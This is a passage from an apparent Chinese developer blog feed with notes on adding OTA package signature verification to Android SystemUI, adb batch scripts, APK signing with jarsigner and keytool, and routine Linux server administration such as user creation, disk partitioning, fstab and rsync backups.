ota</p></li><li><p>在进行OTA包升级操作时，代码需要加上包验证，不加的话如果用其他提供商的固件来升级自己的板子，会卡在recovery无法复位，没法回到Android系统进行二次ota，就需要人工去现场复位。增加验证补丁如下：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/packages/SystemUI/src/com/android/systemui/SystemUIService.java b/packages/SystemUI/src/com/android/systemui/SystemUIService.java</span><br><span class="line">index 41528187c4d5..b8ce1c47e271 100644</span><br><span class="line">--- a/packages/SystemUI/src/com/android/systemui/SystemUIService.java</span><br><span class="line">+++ b/packages/SystemUI/src/com/android/systemui/SystemUIService.java</span><br><span class="line">@@ -47,6 +47,7 @@ import android.util.Log;</span><br><span class="line"> import android.os.RKRecoverySystem;</span><br><span class="line"> import android.os.SystemProperties;</span><br><span class="line"> import java.io.RandomAccessFile;</span><br><span class="line">+import java.security.GeneralSecurityException;</span><br><span class="line"> </span><br><span class="line"> public class SystemUIService extends Service &#123;</span><br><span class="line"> </span><br><span class="line">@@ -166,6 +167,16 @@ public class SystemUIService extends Service &#123;</span><br><span class="line">                 if (!packageFile.exists()) &#123;</span><br><span class="line">                     return;</span><br><span class="line">                 &#125;</span><br><span class="line">+                Log.d(TAG, &quot;doesImageMatchProduct(): start verify package&quot;);</span><br><span class="line">+                try&#123;</span><br><span class="line">+                    RKRecoverySystem.verifyPackage(packageFile, null, null);</span><br><span class="line">+                &#125;catch(GeneralSecurityException e)&#123;</span><br><span class="line">+                    Log.d(TAG, &quot;doesImageMatchProduct(): verifaPackage faild!\n&quot; + e.toString());</span><br><span class="line">+                    return;</span><br><span class="line">+                &#125;catch(Exception e) &#123;</span><br><span class="line">+                    Log.d(TAG, &quot;doesImageMatchProduct(): verifaPackage faild!\n&quot; + e.toString());</span><br><span class="line">+                    return;</span><br><span class="line">+                &#125;</span><br><span class="line">                 try &#123;</span><br><span class="line">                     RKRecoverySystem.installPackage(mContext, packageFile);</span><br><span class="line">                 &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>小技巧-编写windows批处理脚本：在排查问题的时候，经常需要反复烧录固件查看日志来推断是哪里的问题，这里会有一系列流程和adb指令要执行，每次都重复执行很费时，所以可以编写bat脚本来批处理执行。示例脚本如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">scp a58sw01@192.168.120.99:/home/a58sw01/data/3001u/out/target/product/rk3288/system/app/Launcher3/Launcher3.apk .</span><br><span class="line">adb push Launcher3.apk /system/app/Launcher3/Launcher3.apk</span><br><span class="line">adb shell pm clear com.android.launcher3</span><br><span class="line">adb reboot </span><br><span class="line"></span><br><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">scp a58sw01@192.168.120.99:/home/a58sw01/data/3001u/out/target/product/rk3288/system/priv-app/PackageInstaller/PackageInstaller.apk .</span><br><span class="line">adb push PackageInstaller.apk /system/priv-app/PackageInstaller/PackageInstaller.apk</span><br><span class="line">adb shell pm clear com.android.PackageInstaller</span><br><span class="line">del PackageInstaller.apk</span><br><span class="line">adb reboot</span><br><span class="line"></span><br><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">scp a58sw01@192.168.120.95:/home/a58sw01/data/pie_rk3288_android9.0/out/target/product/rk3288/system/priv-app/Settings/Settings.apk .</span><br><span class="line">adb push Settings.apk /system/priv-app/Settings/Settings.apk</span><br><span class="line">del Settings.apk</span><br><span class="line">adb reboot</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安卓APK签名校验</title>
    <link href="/2023/11/05/%E5%AE%89%E5%8D%93APK%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C/"/>
    <url>/2023/11/05/%E5%AE%89%E5%8D%93APK%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="给系统添加签名校验"><a href="#给系统添加签名校验" class="headerlink" title="给系统添加签名校验"></a>给系统添加签名校验</h2><p>今天学习了给APK进行数字签名认证，学习到了认证一般是通过SHA1进行的，涉及到如何读取jks文件的证书，如何读取APK的签名。</p><p>要获得apk的签名则需要apk的路径，而apk的路径很难拿到。在packageManagerService中尝试使用getPackageInfo来获取未安装apk的签名了，但这条路上基本走不通，是Android11更新的包可见性导致的。</p><p>获取签名很重要的就是collectCertificates方法，用来从APK中搜集证书，导师发了一段获取apk证书的代码： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File apkFile = new File(apkPath);</span><br><span class="line">PackageParser.Package pkg = packageParser.parsePackage(apkFile, 0);</span><br><span class="line">packageParser.collectCertificates(pkg, 0);</span><br><span class="line">SigningInfo signingInfo = new SigningInfo(pkg.mSigningDetails); </span><br></pre></td></tr></table></figure><p>他获取apk签名一般都是采用上面这个方法。不过后面发现在PMS中有现成的获得签名的代码，可以直接使用。</p><h2 id="使用cmd查看签名"><a href="#使用cmd查看签名" class="headerlink" title="使用cmd查看签名"></a>使用cmd查看签名</h2><p>学习到了APK如何获得签名，如何更换签名，采用的指令为： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore C:\hukaichao\Code\Andriod\Notification\app\release\GenlotKey.jks C:\hukaichao\Code\Andriod\Notification\app\release\app-release.apk com.genlot.terminal</span><br></pre></td></tr></table></figure><p>该指令是给apk更换签名，apk的签名文件是唯一的，采用这种方法重签名后旧的签名文件就失效了。</p><p>windows命令行查看 keystore文件密钥内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore C:\path\to\your\platform.keystore</span><br></pre></td></tr></table></figure><p>这个命令的参数含义如下：</p><ul><li><strong><code>-list</code>：</strong> 表示列出密钥库中的条目。</li><li><strong><code>-v</code>：</strong> 表示以详细模式显示密钥库中的信息。</li><li><strong><code>-keystore &lt;keystore文件路径&gt;</code>：</strong> 指定keystore文件的路径。</li></ul><p>查看apk文件所携带的密钥内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verify -verbose -certs your_app.apk</span><br></pre></td></tr></table></figure><p>在这个命令中：</p><ul><li><strong><code>-verify</code>：</strong> 用于验证APK文件的签名。</li><li><strong><code>-verbose</code>：</strong> 用于显示详细的输出信息，包括签名者的信息和证书详情。</li><li><strong><code>-certs</code>：</strong> 用于显示APK文件中所有证书的信息。</li></ul><p>安卓sdk下，prebuilts&#x2F;sdk&#x2F;tools 目录的lib下有针对Linux和window平台下的不同的签名jar包工具 在out&#x2F;host&#x2F;linux-86&#x2F;framework目录下有签名jar包：signapk.jar，但是里面涉及到so库就只有Linux系统能用</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux常用指令</title>
    <link href="/2023/11/05/linux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/11/05/linux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>下面是一些linux 服务器运维常用命令：</p><h2 id="1-创建用户"><a href="#1-创建用户" class="headerlink" title="1. 创建用户"></a>1. 创建用户</h2><p>创建用户a23sw02，并且指定shell为&#x2F;bin&#x2F;bash，创建home目录。设置初始化密码为123456。并且加入初始的组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo useradd -m -s /bin/bash a23sw02</span><br><span class="line">$ sudo usermod -a -G adm,cdrom,sudo,dip,plugdev,lpadmin,lxd,sambashare a23sw02</span><br><span class="line">$ <span class="built_in">echo</span> -ne <span class="string">&quot;123456\n123456\n&quot;</span> |sudo passwd a23sw02</span><br></pre></td></tr></table></figure><p>或者可以一步到位：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo useradd -m -G adm,cdrom,sudo,dip,plugdev,lpadmin,lxd,sambashare -s /bin/bash -U -p $(<span class="built_in">echo</span> 123456|openssl passwd -1 -stdin) a23sw02</span><br></pre></td></tr></table></figure><p>如果你想删除用户,下面的命令会删除a28sw02</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo userdel a28sw02</span><br></pre></td></tr></table></figure><h2 id="2-磁盘操作"><a href="#2-磁盘操作" class="headerlink" title="2. 磁盘操作"></a>2. 磁盘操作</h2><h3 id="2-1-查看系统磁盘信息"><a href="#2-1-查看系统磁盘信息" class="headerlink" title="2.1. 查看系统磁盘信息"></a>2.1. 查看系统磁盘信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@techvision-a27:/home/a58sw03<span class="comment"># lsblk</span></span><br><span class="line">NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT</span><br><span class="line">...为了方便查看，这里略去了若干设备</span><br><span class="line">sda           8:0    0   1.8T  0 disk  </span><br><span class="line">nvme1n1     259:1    0 119.2G  0 disk </span><br><span class="line">├─nvme1n1p1 259:2    0   512M  0 part /boot/efi</span><br><span class="line">├─nvme1n1p2 259:3    0     1K  0 part </span><br><span class="line">└─nvme1n1p5 259:4    0 118.8G  0 part /</span><br></pre></td></tr></table></figure><p>上图可以看到sda是没有分区的。</p><h3 id="2-2-创建磁盘分区"><a href="#2-2-创建磁盘分区" class="headerlink" title="2.2 创建磁盘分区"></a>2.2 创建磁盘分区</h3><p>选择要分区的磁盘。这里选择sda</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> cfdisk /dev/sda1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Disk: /dev/sda</span><br><span class="line">            Size: 1.84 TiB, 2000398934016 bytes, 3907029168 sectors</span><br><span class="line">                       Label: dos, identifier: 0x0006d705</span><br><span class="line"></span><br><span class="line">    Device       Boot     Start          End      Sectors    Size   Id Type     </span><br><span class="line">&gt;&gt;  Free space             2048   3907029167   3907027120    1.8T               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> |Filesystem UUID: ecc34f90-b91e-4be6-805b-4eeb36b96a55                       |</span><br><span class="line"> |     Filesystem: ext4                                                       |</span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line">           [   New  ]  [  Quit  ]  [  Help  ]  [  Write ]  [  Dump  ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                      Create new partition from free space</span><br></pre></td></tr></table></figure><p>用上下左右来选择，回车来确定。</p><p>这里选择[New]然后回车</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Disk: /dev/sda</span><br><span class="line">            Size: 1.84 TiB, 2000398934016 bytes, 3907029168 sectors</span><br><span class="line">                       Label: dos, identifier: 0x0006d705</span><br><span class="line"></span><br><span class="line">    Device       Boot     Start          End      Sectors    Size   Id Type     </span><br><span class="line">&gt;&gt;  Free space             2048   3907029167   3907027120    1.8T               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> |Filesystem UUID: ecc34f90-b91e-4be6-805b-4eeb36b96a55                       |</span><br><span class="line"> |     Filesystem: ext4                                                       |</span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> Partition size: 1.8T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     May be followed by M <span class="keyword">for</span> MiB, G <span class="keyword">for</span> GiB, T <span class="keyword">for</span> TiB, or S <span class="keyword">for</span> sectors.</span><br></pre></td></tr></table></figure><p>这里我们只需要一个分区。所以我们直接回车。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Disk: /dev/sda</span><br><span class="line">            Size: 1.84 TiB, 2000398934016 bytes, 3907029168 sectors</span><br><span class="line">                       Label: dos, identifier: 0x0006d705</span><br><span class="line"></span><br><span class="line">    Device       Boot     Start          End      Sectors    Size   Id Type     </span><br><span class="line">&gt;&gt;  Free space             2048   3907029167   3907027120    1.8T               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> |Filesystem UUID: ecc34f90-b91e-4be6-805b-4eeb36b96a55                       |</span><br><span class="line"> |     Filesystem: ext4                                                       |</span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line">                             [ primary]  [extended]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                         0 primary, 0 extended, 4 free</span><br></pre></td></tr></table></figure><p>这里选择主分区，并且回车。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Disk: /dev/sda</span><br><span class="line">            Size: 1.84 TiB, 2000398934016 bytes, 3907029168 sectors</span><br><span class="line">                       Label: dos, identifier: 0x0006d705</span><br><span class="line"></span><br><span class="line">    Device       Boot     Start          End      Sectors    Size   Id Type     </span><br><span class="line">&gt;&gt;  /dev/sda1              2048   3907029167   3907027120    1.8T   83 Linux    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> | Partition <span class="built_in">type</span>: Linux (83)                                                 |</span><br><span class="line"> |Filesystem UUID: ecc34f90-b91e-4be6-805b-4eeb36b96a55                       |</span><br><span class="line"> |     Filesystem: ext4                                                       |</span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line">     [Bootable]  [ Delete ]  [ Resize ]  [  Quit  ]  [  Type  ]  [  Help  ]</span><br><span class="line">     [  Write ]  [  Dump  ]</span><br><span class="line"></span><br><span class="line">            Write partition table to disk (this might destroy data)</span><br></pre></td></tr></table></figure><p>这里将光标移动到[Write]然后回车</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Disk: /dev/sda</span><br><span class="line">            Size: 1.84 TiB, 2000398934016 bytes, 3907029168 sectors</span><br><span class="line">                       Label: dos, identifier: 0x0006d705</span><br><span class="line"></span><br><span class="line">    Device       Boot     Start          End      Sectors    Size   Id Type     </span><br><span class="line">&gt;&gt;  /dev/sda1              2048   3907029167   3907027120    1.8T   83 Linux    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> | Partition <span class="built_in">type</span>: Linux (83)                                                 |</span><br><span class="line"> |Filesystem UUID: ecc34f90-b91e-4be6-805b-4eeb36b96a55                       |</span><br><span class="line"> |     Filesystem: ext4                                                       |</span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> Are you sure you want to write the partition table to disk?               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             Type <span class="string">&quot;yes&quot;</span> or <span class="string">&quot;no&quot;</span>, or press ESC to leave this dialog.</span><br></pre></td></tr></table></figure><p>这里写“yes”。然后回车。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Disk: /dev/sda</span><br><span class="line">            Size: 1.84 TiB, 2000398934016 bytes, 3907029168 sectors</span><br><span class="line">                       Label: dos, identifier: 0x0006d705</span><br><span class="line"></span><br><span class="line">    Device       Boot     Start          End      Sectors    Size   Id Type     </span><br><span class="line">&gt;&gt;  /dev/sda1              2048   3907029167   3907027120    1.8T   83 Linux    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line"> | Partition <span class="built_in">type</span>: Linux (83)                                                 |</span><br><span class="line"> |Filesystem UUID: ecc34f90-b91e-4be6-805b-4eeb36b96a55                       |</span><br><span class="line"> |     Filesystem: ext4                                                       |</span><br><span class="line"> +----------------------------------------------------------------------------+</span><br><span class="line">     [Bootable]  [ Delete ]  [ Resize ]  [  Quit  ]  [  Type  ]  [  Help  ]</span><br><span class="line">     [  Write ]  [  Dump  ]</span><br><span class="line">                     The partition table has been altered.</span><br></pre></td></tr></table></figure><p>这里已经分区完成，我们将光标移动到Quit，然后回车。</p><p>格式化分区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@techvision-a27:/home/techvision<span class="comment"># echo -ne &quot;y&quot; |mkfs.ext4 /dev/sda1</span></span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">Creating filesystem with 488378390 4k blocks and 122101760 inodes</span><br><span class="line">Filesystem UUID: 221d18a9-b363-4893-b91f-a835d2cbc8f9</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, </span><br><span class="line">        4096000, 7962624, 11239424, 20480000, 23887872, 71663616, 78675968, </span><br><span class="line">        102400000, 214990848</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span>                            </span><br><span class="line">Writing inode tables: <span class="keyword">done</span>                            </span><br><span class="line">Creating journal (262144 blocks):</span><br></pre></td></tr></table></figure><p>等待完成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@techvision-a27:/home/techvision<span class="comment"># echo -ne &quot;y&quot; |mkfs.ext4 /dev/sda1</span></span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">Creating filesystem with 488378390 4k blocks and 122101760 inodes</span><br><span class="line">Filesystem UUID: 221d18a9-b363-4893-b91f-a835d2cbc8f9</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, </span><br><span class="line">        4096000, 7962624, 11239424, 20480000, 23887872, 71663616, 78675968, </span><br><span class="line">        102400000, 214990848</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span>                            </span><br><span class="line">Writing inode tables: <span class="keyword">done</span>                            </span><br><span class="line">Creating journal (262144 blocks): <span class="keyword">done</span></span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="2-3-给磁盘重命名卷标"><a href="#2-3-给磁盘重命名卷标" class="headerlink" title="2.3 给磁盘重命名卷标"></a>2.3 给磁盘重命名卷标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> e2label /dev/sda1 data1</span><br></pre></td></tr></table></figure><h3 id="2-4-挂载磁盘"><a href="#2-4-挂载磁盘" class="headerlink" title="2.4 挂载磁盘"></a>2.4 挂载磁盘</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> data</span><br><span class="line"><span class="variable">$sudo</span>  mount -L data1 /home/a58sw01/data</span><br></pre></td></tr></table></figure><h3 id="2-5-自动挂载"><a href="#2-5-自动挂载" class="headerlink" title="2.5 自动挂载"></a>2.5 自动挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">&#x27;echo &quot;LABEL=data1 /home/zhouyu/hukaichao ext4 defaults,nofail 0 0&quot; &gt;&gt; /etc/fstab&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="3-rsync使用"><a href="#3-rsync使用" class="headerlink" title="3. rsync使用"></a>3. rsync使用</h2><p>用rsync来做拷贝可以做到增量拷贝，断点续传，而且可以保证文件权限，属组，软&#x2F;硬链接等权限不被改变。</p><h3 id="3-1-从本地a目录拷贝东西到本地b目录"><a href="#3-1-从本地a目录拷贝东西到本地b目录" class="headerlink" title="3.1 从本地a目录拷贝东西到本地b目录"></a>3.1 从本地a目录拷贝东西到本地b目录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -avrHp a/ b/</span><br></pre></td></tr></table></figure><h3 id="3-2-从本地a目录考本资料到192-168-120-98的-home-a28sw02-目录下"><a href="#3-2-从本地a目录考本资料到192-168-120-98的-home-a28sw02-目录下" class="headerlink" title="3.2 从本地a目录考本资料到192.168.120.98的&#x2F;home&#x2F;a28sw02&#x2F;目录下"></a>3.2 从本地a目录考本资料到192.168.120.98的&#x2F;home&#x2F;a28sw02&#x2F;目录下</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rsync</span> -avrHp a/ a28sw02@192.168.120.98:/home/a28sw02/</span><br></pre></td></tr></table></figure><h3 id="3-3-从192-168-120-98的-home-a28sw02拷贝资料到192-168-120-97的-home-a27sw01目录下"><a href="#3-3-从192-168-120-98的-home-a28sw02拷贝资料到192-168-120-97的-home-a27sw01目录下" class="headerlink" title="3.3 从192.168.120.98的&#x2F;home&#x2F;a28sw02拷贝资料到192.168.120.97的&#x2F;home&#x2F;a27sw01目录下"></a>3.3 从192.168.120.98的&#x2F;home&#x2F;a28sw02拷贝资料到192.168.120.97的&#x2F;home&#x2F;a27sw01目录下</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -avrHp a28sw02@192.168.120.98:/home/a28sw02 a27sw01@192.168.120.97:/home/a27sw01</span><br></pre></td></tr></table></figure><p>注：这里是两台远程服务器，实测是不行的，不知道是不是我测试的问题</p><h3 id="3-4-从192-168-120-98拷贝资料回本地"><a href="#3-4-从192-168-120-98拷贝资料回本地" class="headerlink" title="3.4 从192.168.120.98拷贝资料回本地"></a>3.4 从192.168.120.98拷贝资料回本地</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -avrHp a28sw02@192.168.120.98:/home/a28sw02 ./</span><br></pre></td></tr></table></figure><h3 id="3-5-备份整个系统到优盘"><a href="#3-5-备份整个系统到优盘" class="headerlink" title="3.5 备份整个系统到优盘"></a>3.5 备份整个系统到优盘</h3><p>通过命令查询，优盘挂载的目录在&#x2F;media&#x2F;techvision&#x2F;cb073875-5a99-4d86-a4c6-ddd42081839d。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$lsblk</span></span><br><span class="line">sda           8:0    0 111.8G  0 disk </span><br><span class="line">├─sda1        8:1    0   512M  0 part /boot/efi</span><br><span class="line">└─sda2        8:2    0 111.3G  0 part /</span><br><span class="line">sdb           8:16   0   1.8T  0 disk /home/a28sw02/ssd_sata</span><br><span class="line">sdc           8:32   0   3.7T  0 disk /home/a28sw02/ssd</span><br><span class="line">sdd           8:48   1  57.3G  0 disk </span><br><span class="line">└─sdd1        8:49   1  57.3G  0 part /media/techvision/cb073875-5a99-4d86-a4c6-ddd42081839d</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo rsync -avrHp / --exclude=/home/* --exclude=/dev/* --exclude=/media/*  \</span><br><span class="line">--exclude=/sys/* --exclude=/mnt/* --exclude=/proc/* --exclude=/run/*  \</span><br><span class="line">--exclude=/swapfile /media/techvision/cb073875-5a99-4d86-a4c6-ddd42081839d/</span><br></pre></td></tr></table></figure><p>后续可以通过rsync将该系统部署到已经分好区的磁盘上。部署后需要修改&#x2F;etc&#x2F;fstab和boot 中的grub命令。</p><h2 id="4-journalctl-查看系统日志"><a href="#4-journalctl-查看系统日志" class="headerlink" title="4. journalctl 查看系统日志"></a>4. 